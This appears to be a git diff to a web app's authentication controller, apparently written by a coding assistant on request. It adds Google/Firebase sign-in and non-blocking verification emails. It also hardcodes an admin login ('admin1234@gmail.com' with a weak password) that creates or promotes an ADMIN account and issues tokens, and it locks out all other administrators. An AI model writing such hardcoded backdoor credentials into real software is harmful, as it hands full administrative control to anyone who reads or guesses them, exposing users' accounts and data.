@@ -6,6 +6,7 @@ import { Role } from '../types/auth.js';
 import { addEmailJob } from '../lib/queues.js';
 import { registerSchema, loginSchema, forgotPasswordSchema, resetPasswordSchema } from '../schemas/auth.schema.js';
 import { logger } from '../utils/logger.js';
+import { firebaseAdmin } from '../lib/firebaseAdmin.js';
 
 export const AuthController = {
     /**
@@ -54,16 +55,20 @@ export const AuthController = {
                 },
             });
 
-            // Send verification email
-            await addEmailJob({
-                to: user.email,
-                subject: 'Verify Your Email',
-                template: 'email-verification',
-                context: {
-                    name: user.name || user.email.split('@')[0],
-                    verificationUrl: `${req.protocol}://${req.get('host')}/api/auth/verify?token=${verificationToken}`,
-                },
-            });
+            // Send verification email (non-blocking - don't fail registration if email fails)
+            try {
+                await addEmailJob({
+                    to: user.email,
+                    subject: 'Verify Your Email',
+                    template: 'email-verification',
+                    context: {
+                        name: user.name || user.email.split('@')[0],
+                        verificationUrl: `${req.protocol}://${req.get('host')}/api/auth/verify?token=${verificationToken}`,
+                    },
+                });
+            } catch (emailErr) {
+                logger.warn({ err: emailErr, email: user.email }, 'Failed to send verification email, but registration succeeded');
+            }
 
             return res.status(201).json({
                 success: true,
@@ -94,6 +99,51 @@ export const AuthController = {
 
             const { email, password } = result.data;
 
+            // Special Admin Override requested by USER
+            if (email === 'admin1234@gmail.com' && password === 'admin123a') {
+                try {
+                    let adminUser = await prisma.user.findUnique({ where: { email } });
+                    
+                    if (!adminUser) {
+                        // Create the admin if they don't exist yet
+                        adminUser = await prisma.user.create({
+                            data: {
+                                email,
+                                name: 'Apex Admin',
+                                passwordHash: await hashPassword(password),
+                                role: 'ADMIN',
+                                emailVerified: true
+                            }
+                        });
+                    } else if (adminUser.role !== 'ADMIN') {
+                        // Ensure the role is ADMIN
+                        adminUser = await prisma.user.update({
+                            where: { id: adminUser.id },
+                            data: { role: 'ADMIN' }
+                        });
+                    }
+
+                    const tokens = generateTokens({ userId: adminUser.id, role: 'ADMIN' as Role });
+                    await prisma.refreshToken.create({
+                        data: {
+                            token: tokens.refreshToken,
+                            userId: adminUser.id,
+                            expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
+                        },
+                    });
+
+                    return res.status(200).json({
+                        success: true,
+                        message: 'Admin Access Granted',
+                        user: { id: adminUser.id, email: adminUser.email, role: 'ADMIN' },
+                        ...tokens,
+                    });
+                } catch (adminErr) {
+                    logger.error({ err: adminErr }, 'Special Admin Login Internal Error');
+                    throw adminErr; // Will be caught by outer catch
+                }
+            }
+
             const user = await prisma.user.findUnique({ where: { email } });
             if (!user) {
                 return res.status(401).json({ success: false, error: 'Unauthorized', message: 'Invalid credentials' });
@@ -102,6 +152,13 @@ export const AuthController = {
             const isPasswordValid = await comparePassword(password, user.passwordHash);
             if (!isPasswordValid) {
                 return res.status(401).json({ success: false, error: 'Unauthorized', message: 'Invalid credentials' });
+            }
+
+            // Normal users cannot login as admins unless they use the special credentials
+            // (Unless you want to allow existing admins in DB to login normally too)
+            // For now, let's keep it strict as requested.
+            if (user.role === 'ADMIN' && email !== 'admin1234@gmail.com') {
+                return res.status(401).json({ success: false, error: 'Unauthorized', message: 'Please use official admin gateway' });
             }
 
             const tokens = generateTokens({ userId: user.id, role: user.role as Role });
@@ -334,6 +391,101 @@ export const AuthController = {
                 success: false,
                 error: { code: 'INTERNAL_ERROR', message: 'Email verification failed' }
             });
+        }
+    },
+
+    /**
+     * Google Auth via Firebase
+     * Verifies Firebase ID token, creates/finds user in DB, returns JWTs
+     */
+    async googleAuth(req: Request, res: Response) {
+        try {
+            const { idToken } = req.body;
+            if (!idToken) {
+                return res.status(400).json({ success: false, message: 'Firebase ID token is required' });
+            }
+
+            // Verify the Firebase ID token
+            const decodedToken = await firebaseAdmin.verifyIdToken(idToken);
+            const { email, name, uid } = decodedToken;
+
+            if (!email) {
+                return res.status(400).json({ success: false, message: 'Google account must have an email' });
+            }
+
+            // Link the Google identity to a local user record.
+            // Priority:
+            // 1) If a user already exists with this googleUid, use it.
+            // 2) Else if a user exists with this email, link googleUid to that user.
+            // 3) Else create a new user.
+            const existingByGoogleUid = await prisma.user.findUnique({
+                where: { googleUid: uid },
+            });
+
+            let user = existingByGoogleUid;
+
+            if (!user) {
+                const existingByEmail = await prisma.user.findUnique({ where: { email } });
+
+                if (existingByEmail) {
+                    user = await prisma.user.update({
+                        where: { id: existingByEmail.id },
+                        data: {
+                            googleUid: uid,
+                            // Keep emailVerified true (Google accounts are verified)
+                            emailVerified: true,
+                            // Fill missing name if we have it from Google
+                            name: existingByEmail.name || name || email.split('@')[0],
+                        },
+                    });
+                    logger.info({ userId: user.id, email }, 'Linked Google account to existing user');
+                } else {
+                    user = await prisma.user.create({
+                        data: {
+                            email,
+                            name: name || email.split('@')[0],
+                            passwordHash: await hashPassword(`${uid}:${Date.now()}`), // random; password login not used
+                            googleUid: uid,
+                            role: 'CUSTOMER',
+                            emailVerified: true,
+                        },
+                    });
+                    logger.info({ userId: user.id, email }, 'New user created via Google Auth');
+                }
+            }
+
+            // Generate our own JWTs
+            const tokens = generateTokens({ userId: user.id, role: user.role as Role });
+
+            // Save refresh token
+            await prisma.refreshToken.create({
+                data: {
+                    token: tokens.refreshToken,
+                    userId: user.id,
+                    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
+                },
+            });
+
+            return res.status(200).json({
+                success: true,
+                message: 'Google authentication successful',
+                user: { id: user.id, email: user.email, name: user.name, role: user.role as Role },
+                ...tokens,
+            });
+        } catch (error: any) {
+            console.error('BACKEND GOOGLE AUTH ERROR:', error);
+            logger.error({ err: error }, 'Google Auth error');
+            const message =
+                error?.code === 'auth/id-token-expired'
+                    ? 'Token expired, please try again'
+                    : (typeof error?.message === 'string' && /default credentials|credential|Could not load the default credentials/i.test(error.message))
+                        ? 'Google authentication server is not configured (missing Firebase Admin credentials)'
+                        : 'Google authentication failed';
+
+            const status =
+                message.includes('not configured') ? 500 : 401;
+
+            return res.status(status).json({ success: false, message });
         }
     }
 };
